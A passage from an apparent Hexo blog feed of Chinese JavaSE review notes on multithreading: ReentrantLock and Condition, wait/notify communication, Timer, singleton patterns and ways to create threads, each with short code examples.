class="keyword">out</span>.print(<span class="string">"加"</span>);</span><br><span class="line">System.<span class="keyword">out</span>.print(<span class="string">"油"</span>);</span><br><span class="line">System.<span class="keyword">out</span>.print(<span class="string">"加"</span>);</span><br><span class="line">System.<span class="keyword">out</span>.print(<span class="string">"油"</span>);</span><br><span class="line">System.<span class="keyword">out</span>.print(<span class="string">"！"</span>);</span><br><span class="line">System.<span class="keyword">out</span>.print(<span class="string">"\r\n"</span>);</span><br><span class="line">flag = <span class="number">2</span>;</span><br><span class="line"><span class="comment">//this.notify();</span></span><br><span class="line"><span class="comment">//随机唤醒单个等待的线程</span></span><br><span class="line">c2.signal();</span><br><span class="line">r.unlock();</span><br><span class="line"><span class="comment">//释放锁</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print2</span>(<span class="params"></span>) throws InterruptedException</span> &#123;</span><br><span class="line">r.<span class="keyword">lock</span>();</span><br><span class="line"><span class="keyword">if</span>(flag != <span class="number">2</span>) &#123;</span><br><span class="line">c2.<span class="keyword">await</span>();</span><br><span class="line">&#125;</span><br><span class="line">System.<span class="keyword">out</span>.print(<span class="string">"加"</span>);</span><br><span class="line">System.<span class="keyword">out</span>.print(<span class="string">"油"</span>);</span><br><span class="line">System.<span class="keyword">out</span>.print(<span class="string">"加"</span>);</span><br><span class="line">System.<span class="keyword">out</span>.print(<span class="string">"油"</span>);</span><br><span class="line">System.<span class="keyword">out</span>.print(<span class="string">"\r\n"</span>);</span><br><span class="line">flag = <span class="number">3</span>;</span><br><span class="line"><span class="comment">//this.notify();</span></span><br><span class="line">c3.signal();</span><br><span class="line">r.unlock();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print3</span>(<span class="params"></span>) throws InterruptedException</span> &#123;</span><br><span class="line">r.<span class="keyword">lock</span>();</span><br><span class="line"><span class="keyword">if</span>(flag != <span class="number">3</span>) &#123;</span><br><span class="line">c3.<span class="keyword">await</span>();</span><br><span class="line">&#125;</span><br><span class="line">System.<span class="keyword">out</span>.print(<span class="string">"a"</span>);</span><br><span class="line">System.<span class="keyword">out</span>.print(<span class="string">"b"</span>);</span><br><span class="line">System.<span class="keyword">out</span>.print(<span class="string">"c"</span>);</span><br><span class="line">System.<span class="keyword">out</span>.print(<span class="string">"d"</span>);</span><br><span class="line">System.<span class="keyword">out</span>.print(<span class="string">"e"</span>);</span><br><span class="line">System.<span class="keyword">out</span>.print(<span class="string">"f"</span>);</span><br><span class="line">System.<span class="keyword">out</span>.print(<span class="string">"g"</span>);</span><br><span class="line">System.<span class="keyword">out</span>.print(<span class="string">"\r\n"</span>);</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line">c1.signal();</span><br><span class="line">r.unlock();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;它是锁（synchronized）的封装类，它更加的强大&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;互斥锁类&quot;&gt;&lt;a href=&quot;#互斥锁类&quot; class=&quot;headerlink&quot; title=&quot;互斥锁类&quot;&gt;&lt;/a&gt;互斥锁类&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;reentrantLock&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="JDK5新特性" scheme="http://liuhaoan.github.io/tags/JDK5%E6%96%B0%E7%89%B9%E6%80%A7/"/>
    
      <category term="多线程" scheme="http://liuhaoan.github.io/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
      <category term="互斥锁" scheme="http://liuhaoan.github.io/tags/%E4%BA%92%E6%96%A5%E9%94%81/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——多线程_两线程通信</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%A4%E7%BA%BF%E7%A8%8B%E9%80%9A%E4%BF%A1/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——多线程-两线程通信/</id>
    <published>2019-04-10T09:24:13.000Z</published>
    <updated>2019-04-10T09:31:07.830Z</updated>
    
    <content type="html"><![CDATA[<h3 id="什么时候需要通信"><a href="#什么时候需要通信" class="headerlink" title="什么时候需要通信"></a>什么时候需要通信</h3><blockquote><p>多线程并发时，在默认情况下CPU时随机切换线程执行的，如果我们希望他们又规律的执行，就可以使用通信，例如每个线程执行一次打印</p></blockquote><a id="more"></a><h3 id="Object中方法："><a href="#Object中方法：" class="headerlink" title="Object中方法："></a>Object中方法：</h3><ul><li>.wait()<blockquote><p>让本线程等待（暂停运行）</p></blockquote></li><li>.notify()<blockquote><p>让一条线程停止等待，当有多条线程等待是随机停止等待一条</p></blockquote></li><li>.notifyAll()<blockquote><p>让所有等待线程停止等等待</p></blockquote></li></ul><h3 id="为什么wait方法和notify方法定义在object中？"><a href="#为什么wait方法和notify方法定义在object中？" class="headerlink" title="为什么wait方法和notify方法定义在object中？"></a>为什么wait方法和notify方法定义在object中？</h3><ul><li>答：<blockquote><p>因为锁对象可以是任意对象，而Object是所有类的基类，所以他们两个定义在Object中</p></blockquote></li></ul><h3 id="sleep方法和wait方法的区别是什么（面试题）？"><a href="#sleep方法和wait方法的区别是什么（面试题）？" class="headerlink" title="sleep方法和wait方法的区别是什么（面试题）？"></a>sleep方法和wait方法的区别是什么（面试题）？</h3><blockquote><p>1、sleep方法必须传入参数时间到了自动醒来</p><p>2、wait方法可以传入参数也可以不传入参数，传入参数就是在参数时间后等待，不传入则立马开始等待</p><p>3、sleep在同步代码块或者同步函数中，<strong>不会释放锁</strong>（cpu会一直在这个方法或者代码块中等待）</p><p>4、wait在同步函数或者同步代码块中，<strong>会释放锁</strong>（让cpu可以去执行其他线程）</p></blockquote><h3 id="线程之间通信注意事项："><a href="#线程之间通信注意事项：" class="headerlink" title="线程之间通信注意事项："></a>线程之间通信注意事项：</h3><blockquote><p>带同步代码块中，用哪个对象锁，就用哪个对象调用wait方法等待</p></blockquote><h3 id="线程通信例子（jdk1-5版本之前解决方案）"><a href="#线程通信例子（jdk1-5版本之前解决方案）" class="headerlink" title="线程通信例子（jdk1.5版本之前解决方案）"></a>线程通信例子（jdk1.5版本之前解决方案）</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//等待唤醒机制</span></span><br><span class="line"><span class="keyword">class</span> Printer &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> print1() <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line"><span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(flag != <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">this</span>.wait();</span><br><span class="line"><span class="comment">//当前线程等待</span></span><br><span class="line">&#125;</span><br><span class="line">System.out.<span class="keyword">print</span>(<span class="string">"加"</span>);</span><br><span class="line">System.out.<span class="keyword">print</span>(<span class="string">"油"</span>);</span><br><span class="line">System.out.<span class="keyword">print</span>(<span class="string">"加"</span>);</span><br><span class="line">System.out.<span class="keyword">print</span>(<span class="string">"油"</span>);</span><br><span class="line">System.out.<span class="keyword">print</span>(<span class="string">"！"</span>);</span><br><span class="line">System.out.<span class="keyword">print</span>(<span class="string">"\r\n"</span>);</span><br><span class="line">flag = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">this</span>.notify();</span><br><span class="line"><span class="comment">//随机唤醒单个等待的线程</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> print2() <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line"><span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(flag != <span class="number">2</span>) &#123;</span><br><span class="line"><span class="keyword">this</span>.wait();</span><br><span class="line">&#125;</span><br><span class="line">System.out.<span class="keyword">print</span>(<span class="string">"加"</span>);</span><br><span class="line">System.out.<span class="keyword">print</span>(<span class="string">"油"</span>);</span><br><span class="line">System.out.<span class="keyword">print</span>(<span class="string">"加"</span>);</span><br><span class="line">System.out.<span class="keyword">print</span>(<span class="string">"油"</span>);</span><br><span class="line">System.out.<span class="keyword">print</span>(<span class="string">"\r\n"</span>);</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">this</span>.notify();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ps：两个以以上线程进行通信增加flag值修改即可，不过必须是使用notifyAll，并且判断语句需要使用while不能使用if</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;什么时候需要通信&quot;&gt;&lt;a href=&quot;#什么时候需要通信&quot; class=&quot;headerlink&quot; title=&quot;什么时候需要通信&quot;&gt;&lt;/a&gt;什么时候需要通信&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;多线程并发时，在默认情况下CPU时随机切换线程执行的，如果我们希望他们又规律的执行，就可以使用通信，例如每个线程执行一次打印&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="多线程" scheme="http://liuhaoan.github.io/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
      <category term="两线程通信" scheme="http://liuhaoan.github.io/tags/%E4%B8%A4%E7%BA%BF%E7%A8%8B%E9%80%9A%E4%BF%A1/"/>
    
      <category term="sleep方法和wait方法的区别是什么（面试题）" scheme="http://liuhaoan.github.io/tags/sleep%E6%96%B9%E6%B3%95%E5%92%8Cwait%E6%96%B9%E6%B3%95%E7%9A%84%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%88%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%89/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——多线程_Timer类</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E5%A4%9A%E7%BA%BF%E7%A8%8B-Timer%E7%B1%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——多线程-Timer类/</id>
    <published>2019-04-10T09:22:31.000Z</published>
    <updated>2019-04-10T09:23:51.998Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Timer的概述"><a href="#Timer的概述" class="headerlink" title="Timer的概述"></a>Timer的概述</h1><blockquote><p>它其实就是一个<code>计时器</code>，线程可以用它安排以后在后台执行的任务，可以安排执行一次，或者定期重复执行，<strong>可以把它想象成一个闹钟</strong>。</p></blockquote><a id="more"></a><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><blockquote><p>创建一个定时任务类，继承TimerTask类，然后在主方法创建Timer对象并且传入任务类对象和要执行的时间，如果需要第一次执行之后果断时间继续重复执行，那么就在第三个参数传入一个等待时间</p></blockquote><h3 id="使用方法案例"><a href="#使用方法案例" class="headerlink" title="使用方法案例"></a>使用方法案例</h3><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">Test13_Timer</span> </span>&#123;</span><br><span class="line">    public static void main(<span class="type">String</span>[] args) &#123;</span><br><span class="line">        <span class="type">Timer</span> t = <span class="keyword">new</span> <span class="type">Timer</span>();</span><br><span class="line">        <span class="type">Calendar</span> c = <span class="type">Calendar</span>.getInstance();</span><br><span class="line">        c.set(<span class="type">Calendar</span>.<span class="type">MINUTE</span>, <span class="number">56</span>);</span><br><span class="line">        t.schedule(<span class="keyword">new</span> tesk(), c.getTime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tesk</span> <span class="keyword">extends</span> <span class="title">TimerTask</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    public void run() &#123;</span><br><span class="line">        <span class="type">System</span>.out.println(<span class="string">"定时任务11111"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Timer的概述&quot;&gt;&lt;a href=&quot;#Timer的概述&quot; class=&quot;headerlink&quot; title=&quot;Timer的概述&quot;&gt;&lt;/a&gt;Timer的概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;它其实就是一个&lt;code&gt;计时器&lt;/code&gt;，线程可以用它安排以后在后台执行的任务，可以安排执行一次，或者定期重复执行，&lt;strong&gt;可以把它想象成一个闹钟&lt;/strong&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="多线程" scheme="http://liuhaoan.github.io/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
      <category term="Timer类" scheme="http://liuhaoan.github.io/tags/Timer%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——设计模式_单列设计模式</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%8D%95%E5%88%97%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——设计模式-单列设计模式/</id>
    <published>2019-04-10T09:12:55.000Z</published>
    <updated>2019-04-10T09:21:39.377Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><blockquote><p>单列设计模式就是保证<code>某个类只能被创建一个对象</code></p></blockquote><h3 id="如何保证这个类在内存中只有一个对象呢？"><a href="#如何保证这个类在内存中只有一个对象呢？" class="headerlink" title="如何保证这个类在内存中只有一个对象呢？"></a>如何保证这个类在内存中只有一个对象呢？</h3><blockquote><p>1、私有化它的构造方法，不让别的类访问这个类</p><p>2、在这个类中定义一个本类的对象，并且将它私有化、静态化、并且用最终修饰符修饰。</p><p>3、创建一个静态的get方法返回对这个对象的引用</p></blockquote><a id="more"></a><h3 id="代码示例1（饿汉式）"><a href="#代码示例1（饿汉式）" class="headerlink" title="代码示例1（饿汉式）"></a>代码示例1（饿汉式）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="comment">//1、私有构造方法不让别人访问</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="comment">//2、创建本类对象让别人访问</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton s = <span class="keyword">new</span> Singleton();</span><br><span class="line">    <span class="comment">//3、创建个体方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="为什么叫饿汉式？"><a href="#为什么叫饿汉式？" class="headerlink" title="为什么叫饿汉式？"></a>为什么叫饿汉式？</h3><blockquote><p>因为类一加载就要创建对象，比喻一个饿汉一上来就要吃，吃的东西也就是new的这个对象。</p><ul><li>ps：<br>其实get方法都可以不需要创建，因为引用对象的成员变量是用final修饰的，直接调用即可，当然这样就不是饿汉式了，而是第三种格式。</li></ul></blockquote><h3 id="代码示例2（懒汉式）"><a href="#代码示例2（懒汉式）" class="headerlink" title="代码示例2（懒汉式）"></a>代码示例2（懒汉式）</h3><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">Singleton</span> &#123;</span><br><span class="line">    <span class="comment">//1、私有构造方法不让别人访问</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span>(<span class="params"></span>)</span> &#123;&#125;</span><br><span class="line">    <span class="comment">//2、创建声明引用</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton s ;</span><br><span class="line">    <span class="comment">//3、创建个体方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(s == <span class="literal">null</span>) &#123;</span><br><span class="line">            s = <span class="keyword">new</span> Singleton();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ps：因为它比较懒，要用到的时候才去创建，所以叫懒汉式，但是平时开发不用懒汉式，而用饿汉式。</p><h3 id="为什么平时用饿汉式？"><a href="#为什么平时用饿汉式？" class="headerlink" title="为什么平时用饿汉式？"></a>为什么平时用饿汉式？</h3><ul><li>答：<blockquote><p>因为虽然懒汉式不会浪费空间内存，但是他会有线程安全问题</p><ul><li>举个例子：<br>当我线程1和线程2要获取这个类，当cpu执行的线程1刚好判断进去创建对象的时候，突然cpu又去执行线程2了，当cpu执行完线程2的时候已经创建好了一个对象，这时cpu又回来执行线程1，那么就创建了两个对象，所以它会又线程安全问题。</li></ul></blockquote></li></ul><h3 id="那懒汉式什么时候用？"><a href="#那懒汉式什么时候用？" class="headerlink" title="那懒汉式什么时候用？"></a>那懒汉式什么时候用？</h3><ul><li>答：<blockquote><p>面试的时候！面试的时候会出一个<code>“请写出一个单例的延迟加载模式”</code>，那么这个时候其实就是让我们写懒汉模式。</p></blockquote></li></ul><h3 id="两种单例模式实现的区别"><a href="#两种单例模式实现的区别" class="headerlink" title="两种单例模式实现的区别"></a>两种单例模式实现的区别</h3><blockquote><p>1、饿汉式它是空间换时间</p><ul><li>解析：<br>因为一上来就直接创建对象，要用的时候直接调用，所以要用的时候速度相对更快</li></ul><p>2、懒汉式它是时间换空间</p><ul><li>解析：<br>因为一上来它不创建对象，而要用的时候先判断再创对象，而且以后每次需要用都要判断，所以浪费了时间</li></ul><p>3、在多线程访问时，饿汉式绝对不会创建多个对象，而懒汉式就会存在线程安全问题，会创建多个对象</p></blockquote><h1 id="Runtime类概述："><a href="#Runtime类概述：" class="headerlink" title="Runtime类概述："></a>Runtime类概述：</h1><blockquote><p>每个java程序都有一个Runtime类，它与运行环境相连接，它就是是使用的<code>单例设计模式</code>。</p></blockquote><h3 id="Runtime是的应用场景"><a href="#Runtime是的应用场景" class="headerlink" title="Runtime是的应用场景"></a>Runtime是的应用场景</h3><blockquote><p>当我们需要执行cmd之类的命令的时候就可以勇担Runtime中的exec方法</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;单列设计模式就是保证&lt;code&gt;某个类只能被创建一个对象&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;如何保证这个类在内存中只有一个对象呢？&quot;&gt;&lt;a href=&quot;#如何保证这个类在内存中只有一个对象呢？&quot; class=&quot;headerlink&quot; title=&quot;如何保证这个类在内存中只有一个对象呢？&quot;&gt;&lt;/a&gt;如何保证这个类在内存中只有一个对象呢？&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;1、私有化它的构造方法，不让别的类访问这个类&lt;/p&gt;
&lt;p&gt;2、在这个类中定义一个本类的对象，并且将它私有化、静态化、并且用最终修饰符修饰。&lt;/p&gt;
&lt;p&gt;3、创建一个静态的get方法返回对这个对象的引用&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="设计模式" scheme="http://liuhaoan.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
      <category term="单列设计模式" scheme="http://liuhaoan.github.io/tags/%E5%8D%95%E5%88%97%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
      <category term="延迟加载模式面试题" scheme="http://liuhaoan.github.io/tags/%E5%BB%B6%E8%BF%9F%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%BC%8F%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    
      <category term="Runtime类" scheme="http://liuhaoan.github.io/tags/Runtime%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——线程</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E7%BA%BF%E7%A8%8B/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——线程/</id>
    <published>2019-04-10T09:00:06.000Z</published>
    <updated>2019-04-10T09:43:04.563Z</updated>
    
    <content type="html"><![CDATA[<h1 id="线程概述"><a href="#线程概述" class="headerlink" title="线程概述"></a>线程概述</h1><blockquote><p>线程其实就是程序执行的一条路径，一个进程中可以包含多条线程，多线程并发执行可以提高程序效率，可以同使完成多项任务</p></blockquote><a id="more"></a><h3 id="多线程的应用场景"><a href="#多线程的应用场景" class="headerlink" title="多线程的应用场景"></a>多线程的应用场景</h3><ul><li>迅雷多线程一起下载</li><li>服务器同时处理多个客户请求</li></ul><h3 id="多线程原理-单核CPU"><a href="#多线程原理-单核CPU" class="headerlink" title="多线程原理(单核CPU)"></a>多线程原理(单核CPU)</h3><blockquote><p>在电脑上运行多个程序时，其实cpu一次只能做一个事，做一段时间后然后换另一个另一个做一段时间，只是cpu的速度太快了，<code>看起来就是同时做很多事</code>，也就是说多线程其实<code>只是表面上的多线程</code>，底层cpu还是一次只能做一个事，但是这有个前提，那就是那个cpu是单核cpu，如果事多核cpu，那么就可以真正的达到<strong><code>并行</code></strong>。</p></blockquote><h3 id="多线程并行和并发的区别"><a href="#多线程并行和并发的区别" class="headerlink" title="多线程并行和并发的区别"></a>多线程并行和并发的区别</h3><ul><li>并行<blockquote><p>并行是两个任务同时运行，需要多核cpu，有多少核就可以并行多少任务。</p></blockquote></li><li>并发<blockquote><p>并发是两个任务都请求运行，而一个处理器只能接受一个任务，就安排两个任务轮流进行，由于时间比较段短就感觉两个任务是同时在运行</p></blockquote></li><li>ps<blockquote><p>我们所谓的多线程就是<strong>并发</strong>，如果不使用多线程，那么程序就是一句一句代码请求，如果使用了多线程，那么就可以这个方法请求运行，同时另一个方法也请求运行，也就是说，<code>没有使用多线程的话代码是一条一条请求，使用了就是多条同时请求，但底层并不是并行</code>，只是cpu处理太快了感觉不到。</p></blockquote></li></ul><h3 id="多线程程序实现方法1"><a href="#多线程程序实现方法1" class="headerlink" title="多线程程序实现方法1"></a>多线程程序实现方法1</h3><blockquote><p>1、定义类继承Thread</p><p>2、重写run方法</p><p>3、把新线程要做的事写在run方法中</p><p>4、创建线程对象，也就是我们定义的这个对象</p><p>5、开启新的线程（start），内部会自动执行run方法</p></blockquote><h3 id="多线程程序实现方法2"><a href="#多线程程序实现方法2" class="headerlink" title="多线程程序实现方法2"></a>多线程程序实现方法2</h3><blockquote><p>1、定义类实现Runnable接口</p><p>2、重写run方法</p><p>3、把新线程要做的事卸载run方法中</p><p>4、创建Thread对象，并且给它的构造方法传入一个实现了Runnable接口类的对象</p><p>5、利用Thread开启新的线程</p></blockquote><h3 id="多线程程序实现方法3"><a href="#多线程程序实现方法3" class="headerlink" title="多线程程序实现方法3"></a>多线程程序实现方法3</h3><ul><li><p>第三种创建多线程的接口</p><blockquote><p>Callable</p></blockquote></li><li><p>创建方式：</p><blockquote><p>1、创建一个线程类，并且继承Callable&lt;&gt;类和重写call方法</p><p>2、创建线程池</p><p>3、创建线程对象然后用submit方法加入线程池即可</p></blockquote></li></ul><h3 id="两种实现多线程的区别（面试可能问）"><a href="#两种实现多线程的区别（面试可能问）" class="headerlink" title="两种实现多线程的区别（面试可能问）"></a>两种实现多线程的区别（面试可能问）</h3><ul><li><p>继承Thread：</p><blockquote><p>因为我们创建的类继承了Thread类，所以当我们调用start时，是直接执行子类的run方法，也就是我们创建的类。</p></blockquote></li><li><p>实现Runnable接口创建对象并传入实例化Thread的构造方法：</p><blockquote><p>我们是先创建实现了Runnable接口的对象，然后创建Thread对象并把之前创建的对象传入Thread构造方法，这时Thread类会把传入的对象保存到成员变量中，当我们调用Thread对象的start方法的时候，Thread对象会调用它的成员变量中的run方法，当然这个成员变量就是我们创建的那个实现了Runnable接口的对象</p></blockquote></li></ul><h3 id="两种实现多线程的好处与坏处"><a href="#两种实现多线程的好处与坏处" class="headerlink" title="两种实现多线程的好处与坏处"></a>两种实现多线程的好处与坏处</h3><ul><li><p>继承Thread：</p><blockquote><ul><li><p>好处：<br>可以直接调用Thread中的方法，这样代码简洁。</p></li><li><p>坏处：<br>既然继承了Thread方法就不能继承其他类了</p></li></ul></blockquote></li><li><p>实现Runnable接口：</p><blockquote><ul><li><p>好处：<br>因为接口是可以多实现的，所以可以继承其他父类</p></li><li><p>坏处：<br>不能直接创建对象使用，代码更加复杂</p></li></ul></blockquote></li><li><p>ps：</p><blockquote><p>个人感觉实现Runnable其实是继承Thread的一个补充，在开发时看情况使用。</p></blockquote></li></ul><h3 id="Thread类的方法"><a href="#Thread类的方法" class="headerlink" title="Thread类的方法"></a>Thread类的方法</h3><ul><li>.start()<blockquote><p>开启线程，多次启动是非法的</p></blockquote></li><li>.getName()    <blockquote><p>获取线程名，默认线程名从Thread -0开始以此类推</p></blockquote></li><li>.setName()<blockquote><p>设置线程名</p></blockquote></li><li>.currentThread()<blockquote><p>获取当前线程对象的引用，在哪调用就获取哪的线程</p></blockquote></li><li>.sleep(毫秒, 